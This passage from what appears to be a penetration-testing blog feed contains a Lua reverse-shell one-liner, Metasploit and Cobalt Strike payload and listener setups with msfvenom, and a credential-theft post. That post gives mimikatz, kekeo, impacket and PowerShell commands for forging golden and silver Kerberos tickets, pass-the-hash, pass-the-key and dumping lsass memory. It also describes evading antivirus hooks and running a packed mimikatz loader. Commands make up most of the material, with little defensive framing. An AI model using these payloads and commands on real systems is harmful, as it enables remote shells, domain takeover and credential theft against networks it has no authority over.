<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;ip&#x27;,&#x27;port&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>
<p>And the lua codes are</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;socket&#x27;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">t=socket.tcp()</span><br><span class="line">t:connect(<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;port&#x27;</span>)</span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Meterpreter-amp-Beacon"><a href="#Meterpreter-amp-Beacon" class="headerlink" title="Meterpreter &amp; Beacon"></a>Meterpreter &amp; Beacon</h2><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>For metasploit framework, it has many kinds of reverse shell in <code>meterpreter</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">23   payload/every_platform/meterpreter/reverse_http   </span><br><span class="line">24   payload/every_platform/meterpreter/reverse_https    </span><br><span class="line">25   payload/every_platform/meterpreter/reverse_tcp      </span><br><span class="line">26   payload/every_platform/meterpreter_reverse_http     </span><br><span class="line">27   payload/every_platform/meterpreter_reverse_https     </span><br><span class="line">28   payload/every_platform/meterpreter_reverse_tcp       </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Actually there are about 200 kinds of <code>meterpreter</code> aiming at every platforms.</p>
<h3 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h3><p>For Cobalt Strike, it has named its reverse shell module as <code>beacon</code></p>
<p>Beacon reverse shell listeners are</p>
<ul>
<li><code>windows/beacon_dns/reverse_dns_txt</code></li>
<li><code>windows/beacon_dns/reverse_http</code></li>
<li><code>windows/beacon_http/reverse_http</code></li>
<li><code>windows/beacon_https/reverse_https</code></li>
<li><code>windows/beacon_smb/bind_pipe</code></li>
</ul>
<p>Foreign listeners for external reverse shells(from <code>MSF</code> or <code>Armitage</code>) </p>
<ul>
<li><code>windows/foreign/reverse_dns_txt</code></li>
<li><code>windows/foreign/reverse_http</code></li>
<li><code>windows/foreign/reverse_https</code></li>
<li><code>windows/foreign/reverse_tcp</code></li>
</ul>
<h3 id="Interoperability"><a href="#Interoperability" class="headerlink" title="Interoperability"></a>Interoperability</h3><p>Here we talk about the interoperability between <code>meterpreter</code> and <code>beacon</code>.</p>
<h4 id="From-MSF-to-CS"><a href="#From-MSF-to-CS" class="headerlink" title="From MSF to CS"></a>From MSF to CS</h4><ol>
<li><p>Generate a <code>meterpreter</code> payload</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ msfvenom -p windows/meterpreter/reverse_tcp lhost=msf_ip lport=msf_port -f exe -o hello.exe</span><br></pre></td></tr></table></figure></li>
<li><p>Set listener in Metasploit Framework</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost msf_ip</span><br><span class="line">lhost =&gt; msf_ip</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport msf_port</span><br><span class="line">lport =&gt; msf_port</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure></li>
<li><p>Open Cobalt Strike to create a new listener (using <code>windows/beacon_http/reverse_http</code>)</p>
</li>
<li><p>Use <code>payload_inject</code> module</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">msf5 exploit(multi/handler) &gt; use exploit/windows/<span class="built_in">local</span>/payload_inject </span><br><span class="line"><span class="comment"># payload must be corresponding to that in cs</span></span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> lhost cs_ip</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> lport cs_port</span><br><span class="line"><span class="comment"># set meterpreter session</span></span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> disablepayloadhandler <span class="literal">true</span> </span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; run</span><br></pre></td></tr></table></figure></li>
<li><p>Then we see one new pc gets online in Cobalt Strike.</p>
</li>
</ol>
<p>After that we convert a <code>meterpreter</code> to be a <code>beacon</code>.</p>
<h4 id="From-CS-to-MSF"><a href="#From-CS-to-MSF" class="headerlink" title="From CS to MSF"></a>From CS to MSF</h4><ol>
<li><p>Create a foreign listener in Cobalt Strike (using <code>windows/foreign/reverse_http</code>).</p>
</li>
<li><p>Generate a payload (Windows Executable) in Cobalt Strike.</p>
</li>
<li><p>Open Metasploit Framework to set listener</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost msf_ip</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport msf_port</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure></li>
<li><p>When target triggers the trojan, we will get a <code>meterpreter</code> in Metasploit Framework.</p>
</li>
</ol>
<p>If we have already got a <code>beacon</code>, we can spawn a foreign reverse shell, and deliver a <code>meterpreter</code>.</p>
<h2 id="Online-Resources"><a href="#Online-Resources" class="headerlink" title="Online Resources"></a>Online Resources</h2><p><a class="link"   href="https://github.com/Fahrj/reverse-ssh" >ReverseSSH<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://github.com/NHAS/reverse_ssh" >Reverse SSH<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://github.com/t3l3machus/hoaxshell" >hoaxshell<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>pentest</tag>
        <tag>msf</tag>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>About Stealing Credentials</title>
    <url>/2020/05/25/2020-05-25-About-Stealing-Credentials/</url>
    <content><![CDATA[<p>This part we discuss about how to steal credentials in <code>Domain</code> pentest.</p>
<h2 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h2><p>Before running powerfull tools, we have many concepts to know, like policies of storing passwords.. </p>
<h3 id="NTLM-Protocol"><a href="#NTLM-Protocol" class="headerlink" title="NTLM Protocol"></a>NTLM Protocol</h3><p>In <code>Workgroup</code>, password hashes are saves in local <code>SAM</code> file in <code>%SystemRoot%\system32\config\sam</code>; in <code>Domain</code>, they are saved in file <code>ntds.dit</code> in <code>%SystemRoot%\NTDS</code> of <code>Domain Controllers</code>. Hashes have a format of: USERNAME:SID:LM-Hash:NT-Hash, like: <code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:32057716c8bd0647d9197a9db0b041eb:::</code></p>
<h4 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h4><p><code>LM Hash</code> (LAN Manager Hash) is a way of hash.<br>It converts all letters to uppercase, then converts them to <code>hex</code>. If binary has less than 14 bytes, <code>0</code> needs to add to complete 14 bytes.<br>Then it seperates these 14 bytes into 2 parts, 7 bytes every part, and we add one <code>0</code> at each end.<br>Here we have a magic string: <code>KGS!@#$%</code>. We use it as the key, to do DES encryption for these 2 parts (8 bytes for each). Finally we get <code>LM Hash</code>.</p>
<h4 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h4><p>Since Windows Vista, passwords are defaultly stored as <code>NTLM Hash</code>, not <code>LM Hash</code>.<br><code>NTLM Hash</code> firstly converts password to <code>hex</code>, then to <code>unicode</code>, and finally <code>MD4</code> hash.</p>
<h4 id="NTLM-Authentication"><a href="#NTLM-Authentication" class="headerlink" title="NTLM Authentication"></a>NTLM Authentication</h4><p><img src="/imghost/asc/1.png" alt="NTLM Authentication"></p>
<ol>
<li>Client inputs username &amp; password, then request by sending plain text username to Server.</li>
<li>Server receives request, and sends a random 16 bits (8 bits for NTLM v1, 16bits for NTLM v2) <code>challenge</code> number. Get it hashed by stored <code>NTLM Hash</code>, and saves as <code>challenge1</code>.</li>
<li>Client receives <code>challenge</code>, and hashes it using local password hash as response (<code>challenge2</code>).</li>
<li>Server receives response, compares <code>challenge1</code> and <code>challenge2</code> to auth.<h3 id="Kerberos-Protocol"><a href="#Kerberos-Protocol" class="headerlink" title="Kerberos Protocol"></a>Kerberos Protocol</h3><code>Kerberos</code> is a network auth protocol used in <code>Domain</code>, and it serves for C&#x2F;S programs.<br>There are there roles in the <code>Kerberos</code> protocol:</li>
</ol>
<ul>
<li>Client</li>
<li>Server</li>
<li>KDC<ul>
<li>AS: check Client.</li>
<li>TGS: generate ST (Silver TGS Ticket) for Client to access some server.</li>
</ul>
</li>
</ul>
<p><img src="/imghost/asc/2.png" alt="Kerberos"></p>
<ol>
<li>Client sends a auth request (<code>KRB_AS_REQ</code>) to KDC (<code>AS</code>), with a time stamp encrypted by Client hash. AS receives request and decrypts time stamp with hash in Server side, if it is in a certain time range, means successful authentication.</li>
<li><code>AS</code> checks if user exists in database, then decrypts data with Client hash. If successful, return the TGT (Ticket Granting Ticket) Ticket (<code>Golden Ticket</code>) encrypted by <code>krbtgt</code> (special user, service account in KDC) password hash, and a session key (<code>sessionkey1</code>), which is randomly generated by KDC, and encrypted by Client <code>NTLM hash</code> as <code>KRB_AS_REP</code>. Client cannot decrypt TGT Ticket, but with <code>krbtgt</code> hash we can forge a <code>Golden Ticket</code></li>
<li>Client decrypts <code>sessionkey1</code>, using own password. Client uses decrypted <code>sessionkey1</code> to encrypt time stamp, then sends them all to TGS for ticket to access Server (<code>KRB_TGS_REQ</code>).</li>
<li>TGS receives request, and check whether the Service that Client access is valid. If successful, KDC decrypts <code>Golden Ticket</code> with <code>krbtgt</code> password hash, to see time stamp in it. If <code>Golden Ticket</code> is still valid, return session key encrypted by <code>sessionkey1</code>, and a ticket to Client (<code>KRB_TGS_REP</code>). In TGS response, ticket is encrypted with Server hash, so if we have Server hash, we can forge a <code>Silver Ticket</code>.</li>
<li>Client decrypts <code>sessionkey1</code> as session key (<code>sessionkey2</code>), then uses it to encrypt time stamp and ticket (<code>KRB_AP_REQ</code>), finally sends to Server.</li>
<li>Server decrypts ticket using own hash to get <code>sessionkey2</code>. Use <code>sessionkey2</code> to decrypt time stamp. After that Server uses PAC to ask KDC whether Client is able to access. <code>Domain Controller</code> decrypt PAC to let Client know whether it’s the right Server.</li>
</ol>
<p>All Kerberos tickets are stored in <code>LSASS</code> process in memory.</p>
<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p>It appears in Step.2 of <code>Kerberos</code> protocol, which is the TGT Ticket(20 mins valid), delivered to Client by AS. It is encrypted by <code>krbtgt</code> password hash which is normally unchanged, so if <code>Domain Controller</code> changes password, we can still forge a <code>Golden Ticket</code> to control.</p>
<p>A <code>Golden Ticket</code> consists of <code>Domain Name</code>, <code>Domain SID</code>, <code>krbtgt</code> password hash, and forged username. We can use <code>mimikatz</code>, <code>cobaltstrike</code> and <code>metasploit</code> to do forgery.</p>
<h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>Export <code>krbtgt</code> password hash (aes256_hmac).</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug      </span><br><span class="line">mimikatz # lsadump::dcsync /domain:domain_name /user:krbtgt</span><br></pre></td></tr></table></figure>
<p>Then get <code>Domain SID</code> (SID without the <code>-number</code> at the end)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; whoami /all</span><br></pre></td></tr></table></figure>
<p>Forge <code>Golden Ticket</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::golden /domain:domain_name /sid:S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx /aes256:krbtgt_password_hash /user:user_name /ticket:gold.kirbi</span><br></pre></td></tr></table></figure>
<p>Finally import ticket.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">kerberos::ptt c:\Users\your_user_name\gold.kirbi</span><br></pre></td></tr></table></figure>
<p>Another way is (using rc4_plain)</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:domain_name /sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-xxxxxxxxxx</span><span class="literal">-xxxxxxxxxx</span><span class="literal">-xxxxxxxxxx</span> /rc4:krbtgt_password_hash /user:user_name /ptt</span><br></pre></td></tr></table></figure>
<h4 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h4><p>After one beacon is online -&gt; Execute -&gt; Golden Ticket </p>
<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>In the metepreter, frst load module.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br></pre></td></tr></table></figure>
<p>Generate Golden Ticket.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; golden_ticket_create -d domain_name -k krbtgt_password_hash -s S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx -u user_name -t /tmp/golden.ticket</span><br></pre></td></tr></table></figure>
<p>Import into memory</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; kerberos_ticket_use /tmp/golden.ticket</span><br></pre></td></tr></table></figure>
<h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3><p>It is ST that TGS delivers to Client in Step.4 and Step.5 of <code>Kerberos</code> protocol. Server will decrypt Client with Client hash, so this process doesn’t go via kDC, but <code>Silver Ticket</code> can be only used for once.</p>
<p>A <code>Silver Ticket</code> consists of <code>Domain Name</code>, <code>Domain SID</code>, <code>Domain</code> Service <code>NTLM hash</code>, forged username, and target <code>Kerberos</code> service.<br>Common services like:</p>
<table>
<thead>
<tr>
<th>Service Note</th>
<th>Service Name</th>
</tr>
</thead>
<tbody><tr>
<td>WMI</td>
<td>HOST, RPCSS</td>
</tr>
<tr>
<td>Powershell Remoting</td>
<td>HOST, HTTP</td>
</tr>
<tr>
<td>WinRM</td>
<td>HOST, HTTP</td>
</tr>
<tr>
<td>Scheduled Tasks</td>
<td>Host</td>
</tr>
<tr>
<td>LADP, DCSync</td>
<td>LDAP</td>
</tr>
<tr>
<td>Windows File Share</td>
<td>CIFS</td>
</tr>
<tr>
<td>Windows Remote Server AdministrationTools</td>
<td>RPCSS, LDAP, CIFS</td>
</tr>
</tbody></table>
<p>Forge the <code>Silver Ticket</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::golden /domain:domain_name /sid:S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx /target:domain_target_member /service:cifs /rc4:krbtgt_password_hash /user:user_name /ptt</span><br></pre></td></tr></table></figure>
<p>To defend this, add <code>ValidateKdcPacSignature</code> with value <code>1</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</span><br></pre></td></tr></table></figure>
<h3 id="Other-Methods-to-Abuse-Kerberos"><a href="#Other-Methods-to-Abuse-Kerberos" class="headerlink" title="Other Methods to Abuse Kerberos"></a>Other Methods to Abuse Kerberos</h3><p>Other than <code>Golden Ticket</code> Attack and <code>Silver Ticket</code> Attack, there are <a class="link"   href="https://www.hackingarticles.in/kerberos-brute-force-attack/" >Kerberos Brute Force Attack<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/" >Kerberoasting<i class="fas fa-external-link-alt"></i></a>, and <a class="link"   href="https://www.hackingarticles.in/as-rep-roasting/" >AS-REP Roasting<i class="fas fa-external-link-alt"></i></a> …</p>
<h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h3><p>“Pass the hash” (<code>PTH</code>) allows attackers to authenticate by using the underlying NTLM or LanMan hash of a user’s password, instead of requiring the associated plaintext password as is normally the case. </p>
<p>Hash can be devided into <code>LM Hash</code> and <code>NTLM Hash</code> which mentioned <a href="#NTLM-Protocol">before</a>. If length of password goes beyond 15, <code>LM Hash</code> will not be generated, and it has been disabled since Windows Vista and Windows Server 2008, so most of the time we try to capture <code>NTLM hash</code> for <code>PTH</code>.</p>
<p>The <code>PTH</code> pentest is:</p>
<ol>
<li>Controll a <code>Domain</code> Member.</li>
<li>Dump user password hash.</li>
<li>Use <code>PTH</code> to log in to other pc and keep on dumping hashes.</li>
<li>Keep searching hash of <code>Domain Controller</code>, then take over the <code>Domain</code>.</li>
</ol>
<h4 id="Capture-NTLM-Hash"><a href="#Capture-NTLM-Hash" class="headerlink" title="Capture NTLM Hash"></a>Capture <code>NTLM Hash</code></h4><p><code>NTLM</code>(NT LAN Manager) is the only successor of <code>LM</code> (LAN Manager), and it adds a Challenge-Response verification mechanism which was introduced <a href="#NTML-Hash">here</a>.</p>
<p>For <code>NTLM</code> we also have <code>NTLM Hash</code> and <code>Net-NTLM Hash</code>.<br><code>NTLM Hash</code> is stored in local <code>SAM</code> (Security Account Manager) file, so you can use <code>mimikatz</code> to extract from <code>SAM</code> or <code>NTDS.dit</code> of <code>Domian Controller</code>.<br><code>Net-NTLM Hash</code> is in the response of Challenge-Response verification. A popular util <a class="link"   href="https://github.com/lgandx/Responder" >Responder<i class="fas fa-external-link-alt"></i></a> is borned for this (and <a class="link"   href="https://github.com/Kevin-Robertson/Inveigh" >Inveigh<i class="fas fa-external-link-alt"></i></a> in <code>Powershell</code>.)<br>After acquiring the hash, use <a href="https://github.com/hashcat/hashcat.git"><code>hashcat</code></a> to brute force using dictionaries, or just pass the hash to login.</p>
<h4 id="PTH-Tools"><a href="#PTH-Tools" class="headerlink" title="PTH Tools"></a><code>PTH</code> Tools</h4><p>On <code>Kali</code>, we have <code>meterpreter</code> and some other tools sets, like <code>exploit/windows/smb/psexec</code> module in <code>msf</code>.</p>
<p>In Python library <code>impacket</code>, we have <a class="link"   href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/0b46f198042626a1ecd2846d22db355453e29c03/examples/smbexec.py" >smbexec<i class="fas fa-external-link-alt"></i></a>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python smbexec.py -<span class="built_in">hash</span> LM-Hash:NT-Hash user_name@target_ip</span><br><span class="line">or</span><br><span class="line">python smbexec.py -hashes :NT-Hash user_name@target_ip <span class="comment"># no need for LM-Hash</span></span><br></pre></td></tr></table></figure>
<p>On Windows we have <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py"><code>wmiexec.py</code></a> and <a class="link"   href="https://github.com/maaaaz/impacket-examples-windows" >exe version<i class="fas fa-external-link-alt"></i></a>.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; wmiexec <span class="literal">-hashes</span> <span class="number">00000000000000000000000000000000</span>:<span class="number">7</span>ECFFFF0C3548187607A14BAD0F88BB1 TEST/test1@<span class="number">192.168</span>.<span class="number">1.1</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
<p>Parameter <code>hashes</code> goes like: <code>LM-HASH:NTLM-HASH</code>.</p>
<p>We also have powerful <a href="https://github.com/Kevin-Robertson/Invoke-TheHash/"><code>Powershell</code> Tools</a>.<br><code>Invoke-WMIExec</code> is like <code>wmiexec.py</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> target_ip <span class="literal">-Domain</span> domain_name <span class="literal">-Username</span> user_name <span class="literal">-Hash</span> ntlm_hash <span class="literal">-Command</span> <span class="string">&quot;calc.exe&quot;</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>
<p><code>Invoke-SMBExec</code> using <code>system</code> privilege to execute on target.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> target_ip <span class="literal">-Domain</span> domain_name <span class="literal">-Username</span> user_name <span class="literal">-Hash</span> ntlm_hash <span class="literal">-Command</span> <span class="string">&quot;calc.exe&quot;</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>
<h4 id="Pass-The-Key"><a href="#Pass-The-Key" class="headerlink" title="Pass The Key"></a>Pass The Key</h4><p>We should get:</p>
<ul>
<li>Username</li>
<li><code>Domain Name</code></li>
<li><code>NTLM Hash</code></li>
</ul>
<p>Use <code>mimikatz</code>:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:user_name /domain:domain_name /ntlm: ntlm_hash&quot;</span></span><br></pre></td></tr></table></figure>
<p>A cmd will pop up.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">dir</span> \\target_ip\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
<p>It’ll be successful.</p>
<p>Actually <code>sekurlsa::pth</code> in <code>mimikatz</code> is called <code>Overpass-the-Hash</code>, aka <code>Pass-the-Key</code>.</p>
<p>Note: “ntlm hash is mandatory on XP&#x2F;2003&#x2F;Vista&#x2F;2008 and before 7&#x2F;2008r2&#x2F;8&#x2F;2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1&#x2F;2012r2 or 7&#x2F;2008r2&#x2F;8&#x2F;2012 with kb2871997, in this case you can avoid ntlm hash.”<br>Which means we can also conduct <code>PTH</code> with AES keys, if <code>kb2871997</code> is patched&#x2F;installed.</p>
<p>Still in <code>mimikatz</code>:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:user_name /domain:domain_name /aes256: aes256_hmac&quot;</span> </span><br></pre></td></tr></table></figure>
<h4 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h4><p>Because <code>PTH</code> of <code>mimikatz</code> needs privilege as Admin, <code>mimikatz</code> provides another way that dont need – <code>Pass-the-Ticket</code>. It requires a open source util: <a href="https://github.com/gentilkiwi/kekeo"><code>kekeo</code></a>.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; kekeo <span class="string">&quot;tgt::ask /user:user_name /domain:domain_name /ntlm:ntlm_hash&quot;</span></span><br></pre></td></tr></table></figure>
<p>Then it generates a ticket, we import it.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; kekeo <span class="string">&quot;kerberos::ptt TGT_xx@xxx_krbtgt~xxx@xxx.xxxx&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="Related"><a href="#Related" class="headerlink" title="Related"></a>Related</h4><p><a class="link"   href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop(Restricted-Admin-mode)/" >Pass the Hash with Remote Desktop (Restricted Admin mode)<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://www.4hou.com/posts/1QWo" >Pass the Hash with Remote Desktop Protocol<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="Steal-Credentials"><a href="#Steal-Credentials" class="headerlink" title="Steal Credentials"></a>Steal Credentials</h2><p>Credentials can be plain text password, or password hash. With either of them, login and controlling target will be easier.</p>
<h3 id="From-lsass-exe-Process"><a href="#From-lsass-exe-Process" class="headerlink" title="From lsass.exe Process"></a>From <code>lsass.exe</code> Process</h3><p>As I mentioned, all Kerberos tickets are stored in <code>LSASS</code> process in memory.</p>
<h4 id="Normal-Ways"><a href="#Normal-Ways" class="headerlink" title="Normal Ways"></a>Normal Ways</h4><p>Use <code>mimikatz</code> (will be detected)</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe log <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
<p>Or dump memory and export credentials. For example, <code>procdump</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; procdump64.exe <span class="literal">-accepteula</span> <span class="literal">-ma</span> lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
<p>Other tools like <a class="link"   href="https://github.com/killswitch-GUI/minidump-lib" >minidump-lib<i class="fas fa-external-link-alt"></i></a> in C++, <a class="link"   href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1" >Out-Minidump.ps1<i class="fas fa-external-link-alt"></i></a> in Powershell, and <a class="link"   href="https://github.com/GhostPack/SharpDump" >SharpDump<i class="fas fa-external-link-alt"></i></a> in C#.<br><code>comsvcs.dll</code> can also be used, but it needs <code>SeDebugPrivilege</code> privilege, so only in Powershell as Administrator will this privilege status be <code>Enable</code>(even cmd as Administrator has it <code>Disabled</code>).</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; powershell <span class="literal">-c</span> <span class="string">&quot;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full&quot;</span></span><br></pre></td></tr></table></figure>
<p>Actually all above are using API <code>MiniDumpWriteDump()</code> to get process dump, and some antivirus softwares start to block it by API hook (edit 5 bytes at the start of <code>NtReadVirtualMemory()</code>). We can fix that 5 bytes, and rewrite <code>NtReadVirtualMemory()</code>. See <a class="link"   href="https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6" >Bypass EDR’s memory protection, introduction to hooking<i class="fas fa-external-link-alt"></i></a> and the tool – <a class="link"   href="https://github.com/outflanknl/Dumpert" >Dumpert<i class="fas fa-external-link-alt"></i></a>.</p>
<p>After dumping, use <code>mimikatz</code> to export credentials.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe log <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
<h4 id="Limited-Upload-Length"><a href="#Limited-Upload-Length" class="headerlink" title="Limited Upload Length"></a>Limited Upload Length</h4><p>Based on <a class="link"   href="https://github.com/re4lity/subTee-gits-backups/blob/master/PELoader.cs" >PELoader.cs<i class="fas fa-external-link-alt"></i></a>, a newer <code>mimikatz</code> was packed in <a class="link"   href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/PELoaderofMimikatz.cs" >PELoaderofMimikatz.cs<i class="fas fa-external-link-alt"></i></a>. They load a compressed <code>mimikatz</code> whiling running.<br>Use <code>csc.exe</code> to compile</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v3.<span class="number">5</span>\csc.exe PELoaderofMimikatz.cs /unsafe</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\csc.exe PELoaderofMimikatz.cs /unsafe</span><br></pre></td></tr></table></figure>
<p>Export credentials</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PELoaderofMimikatz.exe log <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
<p>Or add commands first (compile as PELoaderofMimikatzAuto.exe), then use <code>InstallUtil.exe</code> to export credentials.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\InstallUtil.exe /logfile= /LogToConsole=false /U PELoaderofMimikatzAuto.exe</span><br></pre></td></tr></table></figure>
